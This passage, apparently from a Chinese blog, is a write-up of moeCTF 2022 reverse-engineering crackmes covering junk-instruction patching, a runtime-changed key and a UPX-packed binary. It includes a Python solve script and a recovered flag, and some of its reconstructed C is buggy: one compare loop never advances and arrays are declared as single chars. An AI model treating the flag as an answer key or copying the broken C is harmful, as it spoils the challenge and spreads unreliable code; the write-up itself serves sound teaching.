    src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669119756474-62dbeb1d-47f7-4a40-803c-ac1222954ed7.png"                      alt="image.png"                ><br>同样的patch方法将loc_401080函数也整出来。可以看出是一个移位的函数<code>a1[i] = (16 * a1[i]) | ((int)(unsigned __int8)a1[i] &gt;&gt; 4)</code> 将每一个字节的前4bit放到后 4bit，后4bit放到前4bit。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669120373409-526071e5-ca5b-4e88-8203-68bc8c247e5e.png"                      alt="image.png"                ><br>最后与unk_403000函数的数据进行比较，将数据导出<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669120813619-f41f1e62-3875-4e29-9225-b0c5cbd486e4.png"                      alt="image.png"                ></p><blockquote><p>报错：ValueError: bytes must be in range(0, 256)<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669121987644-2e27488f-50d4-4065-819c-ec4cb3053631.png"                      alt="image.png"                ><br>bytes()函数：<br>语法：class bytes([source[, encoding[, errors]]])<br>返回一个新的“bytes”对象，它是0&lt;&#x3D;x&lt;256范围内的不可变整数序列。</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0xCD</span>, <span class="number">0x4D</span>, <span class="number">0x8C</span>, <span class="number">0x7D</span>, <span class="number">0xAD</span>, <span class="number">0x1E</span>, <span class="number">0xBE</span>, <span class="number">0x4A</span>, <span class="number">0x8A</span>, <span class="number">0x7D</span>, </span><br><span class="line">     <span class="number">0xBC</span>, <span class="number">0x7C</span>, <span class="number">0xFC</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x9D</span>, <span class="number">0x6A</span>, <span class="number">0x1A</span>, <span class="number">0xCC</span>, </span><br><span class="line">     <span class="number">0x3D</span>, <span class="number">0x4A</span>, <span class="number">0xF8</span>, <span class="number">0x3C</span>, <span class="number">0x79</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0xD9</span>, <span class="number">0xDD</span>, <span class="number">0x9D</span>, </span><br><span class="line">     <span class="number">0xA9</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0x8C</span>, <span class="number">0xDD</span>, <span class="number">0x59</span>, <span class="number">0xE9</span>, <span class="number">0xD7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="comment">#伪代码中loc_401080是第二步加密</span></span><br><span class="line">    <span class="comment">#所以在exp中是第一层解密</span></span><br><span class="line">    enc[i] = ((enc[i]&gt;&gt;<span class="number">4</span>)|(enc[i]&lt;&lt;<span class="number">4</span>)) &amp;<span class="number">0xff</span></span><br><span class="line"><span class="comment">#for i in range(len(enc)):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#range([start],stop,[step]) 减的操作 所以step=-1</span></span><br><span class="line">    <span class="comment">#源代码:enc[i] = enc[i+1]</span></span><br><span class="line">    enc[i-<span class="number">1</span>]-=enc[i] </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(enc))     </span><br><span class="line"></span><br><span class="line"><span class="comment">##moectf&#123;p4tch_pr0gr4m_t0_d3c0mpi1e_it!&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>花指令介绍：<a class="link"   href="https://www.yuque.com/juana-s0ric/pgpzyd/tghdn3e2re378fv5" >什么是花指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>&amp;0xff的作用：<strong>主要是为了将有符号数转换为无符号数，</strong>实际意义就是取字节，高位补0，保留低八位的数</p></blockquote><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> check[]=&#123;<span class="number">0xCD</span>, <span class="number">0x4D</span>, <span class="number">0x8C</span>, <span class="number">0x7D</span>, <span class="number">0xAD</span>, <span class="number">0x1E</span>, <span class="number">0xBE</span>, <span class="number">0x4A</span>, <span class="number">0x8A</span>, <span class="number">0x7D</span>, </span><br><span class="line">     <span class="number">0xBC</span>, <span class="number">0x7C</span>, <span class="number">0xFC</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x9D</span>, <span class="number">0x6A</span>, <span class="number">0x1A</span>, <span class="number">0xCC</span>, </span><br><span class="line">     <span class="number">0x3D</span>, <span class="number">0x4A</span>, <span class="number">0xF8</span>, <span class="number">0x3C</span>, <span class="number">0x79</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0xD9</span>, <span class="number">0xDD</span>, <span class="number">0x9D</span>, </span><br><span class="line">     <span class="number">0xA9</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0x8C</span>, <span class="number">0xDD</span>, <span class="number">0x59</span>, <span class="number">0xE9</span>, <span class="number">0xD7</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">enc1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*input)</span>&#123;</span><br><span class="line">    _asm &#123;</span><br><span class="line">        jz label</span><br><span class="line">        jnz label</span><br><span class="line">        _emit <span class="number">0xe9</span></span><br><span class="line">        label:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input)<span class="number">-1</span>;i++)</span><br><span class="line">        input[i]+=input[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">enc2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*input)</span>&#123;</span><br><span class="line">    _asm&#123;</span><br><span class="line">        jz label</span><br><span class="line">        jnz label</span><br><span class="line">        _emit <span class="number">0xe9</span></span><br><span class="line">        label:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input);i++)</span><br><span class="line">        input[i]=((input[i]&gt;&gt;<span class="number">4</span>)|(input[i]&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_strcmp</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s1,<span class="type">unsigned</span> <span class="type">char</span>*s2)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>,f=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;<span class="number">38</span>)</span><br><span class="line">        <span class="keyword">if</span>(s1[i]==s2[i])</span><br><span class="line">        f++;</span><br><span class="line">    <span class="keyword">if</span>(f==<span class="number">38</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I poisoned the program... Can you reverse it?!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come on! Give me your flag:&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%s&quot;</span>,input,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input) != <span class="number">38</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        enc1(input);</span><br><span class="line">        enc2(input);</span><br><span class="line">        <span class="keyword">if</span>(my_strcmp(input,check))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nTTTTTTTTTTQQQQQQQQQQQQQLLLLLLLLL!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="fake-key"><a href="#fake-key" class="headerlink" title="fake key"></a>fake key</h2><p>根据伪代码：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+90h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+94h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401800(argc, argv, envp);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(::Str);  <span class="comment">//Str = &#x27;yunzh1jun&#x27; v6是Str的长度 但这个密钥是假的quq~</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I changed the key secretly, you can&#x27;t find the right key!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And I use random numbers to rot my input, you can never guess them!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Unless you debug to get the key and random numbers...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);  <span class="comment">//输入Str</span></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(Str);   <span class="comment">//获取Str的长度</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) </span><br><span class="line">    Str[i] ^= ::Str[i % v6];  <span class="comment">//Str的每一个元素与::Str中每个元素对v6取余重新赋给::Str</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j ) </span><br><span class="line">    Str[j] += rand() % <span class="number">10</span>;  <span class="comment">//Str的每个元素，rand()％10 取出所得的随机数的个位。</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4015A2(Str, &amp;unk_403020) ) <span class="comment">//两个数组相同则成功</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nRight! TTTTTQQQQQLLLLL!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>可以看出伪代码还是比较乱的，将<code>Str--&gt;input``::Str--&gt;key``v6--&gt;key_len``v5--&gt;input_len</code>分别对应改为我们能看清楚的函数名<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669203480112-7557db02-2fa1-4281-9360-55124828953c.png"                      alt="Str展开" title="Str展开"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669203859301-ff71e1e3-5df1-4af0-88b9-fc851f7d639e.png"                      alt="unk_403020展开的数组" title="unk_403020展开的数组"                ><br>官方给的wp中写道是：双击已经改过(::Str)的key字符是<code>yunzh1jun</code>，在line17行下断点进行调式</p><blockquote><p>啊~G掉了，ida动调不了，需要自己修一下，报错如下<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669210358324-24930418-87b9-47bf-80c1-070c1a55b2e0.png"                      alt="image.png"                ><br>官网下载bochs:<a class="link"   href="http://sourceforge.net/projects/bochs/files/bochs/" >http://sourceforge.net/projects/bochs/files/bochs/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>默认下载的地址就好  C:\Program Files\Bochs-2.7 额额额 没好 呜呜呜~~<br>害，我发现这个家伙，服了。<br>是用这个家伙来构建一个虚拟机一样的家伙来动调代码，完全可以用本地windows来动调的！<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669213332914-24bc64fc-cc22-4093-bba2-090732f80858.png"                      alt="cfea52d0fae8e1797ff0ffefb3c74971.png"                ><br>这里选择的是<code>Remote Windows debugger</code>而不是<code>Local Windows debugger</code></p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669213558811-b4d9a894-6a4f-4a0f-a979-f813d0e5eecb.png"                      alt="image.png"                ><br>出现动调之后界面之后，双击key发现，这里的key值变掉了。<br>(数据全部选中之后按C转为代码) key值即为<code>yunzh1junTCL,trackYYDS</code><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669213416570-76bdd109-9a10-4d5a-9368-c36508a28086.png"                      alt="image.png"                ><br>关键的一步将真正的key值找出来了。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input_len; <span class="comment">// [rsp+90h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> key_len; <span class="comment">// [rsp+94h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401800(argc, argv, envp);</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I changed the key secretly, you can&#x27;t find the right key!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And I use random numbers to rot my input, you can never guess them!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Unless you debug to get the key and random numbers...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  input_len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; input_len; ++i )</span><br><span class="line">    input[i] ^= key[i % key_len];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; input_len; ++j )</span><br><span class="line">    input[j] += rand() % <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4015A2(input, enc) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nRight! TTTTTQQQQQLLLLL!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enc = &#123;<span class="number">21</span>,  <span class="number">33</span>,  <span class="number">15</span>,  <span class="number">25</span>,  <span class="number">37</span>,  <span class="number">91</span>,  <span class="number">25</span>,  <span class="number">57</span>,  <span class="number">95</span>,  <span class="number">58</span>, </span><br><span class="line">   <span class="number">59</span>,  <span class="number">48</span>, <span class="number">116</span>,   <span class="number">7</span>,  <span class="number">67</span>,  <span class="number">63</span>,   <span class="number">9</span>,  <span class="number">90</span>,  <span class="number">52</span>,  <span class="number">12</span>, </span><br><span class="line">  <span class="number">116</span>,  <span class="number">63</span>,  <span class="number">30</span>,  <span class="number">45</span>,  <span class="number">39</span>,  <span class="number">33</span>,  <span class="number">18</span>,  <span class="number">22</span>,  <span class="number">31</span>,   <span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key = &#123;<span class="string">&quot;yunzh1jun&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">__attribute((constructor)) <span class="type">static</span> <span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">strcat</span>(key,<span class="string">&quot;TCL,trackYYDS&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I changed the key secretly, you can&#x27;t find the right key!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And I use random numbers to rot my input, you can never guess them!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unless you debug to get the key and random numbers...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now give me your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    <span class="type">int</span> input_len = <span class="built_in">strlen</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; input_len; ++i )</span><br><span class="line">        input[i] ^= key[i % key_len];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; input_len; ++j )</span><br><span class="line">        input[j] += rand() % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input,enc))</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nRight! TTTTTQQQQQLLLLL!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>害 不会了 待会儿再继续复盘<br>新思路：<br><a class="link"   href="https://iooo.top/share/moectf2022.html#fakekey" >https://iooo.top/share/moectf2022.html#fakekey <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><hr><h2 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h2><p>通过直接将程序打开发现会和upx壳打包有关 使用工具脱壳<br>查看伪代码（整理后的代码）</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">108</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_402030(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know UPX???&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh no...Something seems to be wrong...My equations has multiple solutions...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;May be I can check it by a hash algorithm. You can never reverse it!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">27</span>; ++i )</span><br><span class="line">    v4[i] = input[i];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">27</span>; ++i )</span><br><span class="line">    input[i - <span class="number">1</span>] ^= (input[i - <span class="number">1</span>] % <span class="number">17</span> + input[i]) ^ <span class="number">0x19</span>;<span class="comment">//加密语句</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, &amp;Str2) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)sub_401550(v4) )<span class="comment">//搞懂这个sub_401550函数是啥东西</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nGood job!!! You know UPX and hash!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ. Something wrong. Please try again. &gt;_&lt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>读代码操作<br>大概都是可以看懂的</p><ol><li><code>sub_402030(argc, argv, envp);</code> marks the beginning and end of program execution. A C or C++ program must have one function named main.<br>三个参数：<br>:::info<br>argc:表示命令行参数，第一个是执行程序名，最少是1<br>argv:具体的参数<br>envp:系统环境的变量，“名称&#x3D;值”的格式，NULL为结束<br>:::<br>将Str2的字符提取出来。<br>另一个函数就是sub_401550函数对v4进行处理只有点击进去继续看</li></ol></blockquote><hr><h4 id="sub-401550函数"><a href="#sub-401550函数" class="headerlink" title="sub_401550函数"></a>sub_401550函数</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_401550</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">    &#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 a1_len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Buf2[<span class="number">44</span>]; <span class="comment">// [rsp+90h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  k = <span class="number">1</span>;</span><br><span class="line">  sub_401B66((__int64)v3);</span><br><span class="line">  a1_len = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  sub_401BE0((__int64)v3, (__int64)a1, a1_len);</span><br><span class="line">  sub_401C7D((__int64)v3, (__int64)Buf2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(&amp;unk_404040, Buf2, <span class="number">32u</span>i64) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1674561799504-f860836f-48f0-421c-a333-1d45f00b6e22.png"                      alt="image.png"                ><br>其中存有好几个函数继续加密</p><h5 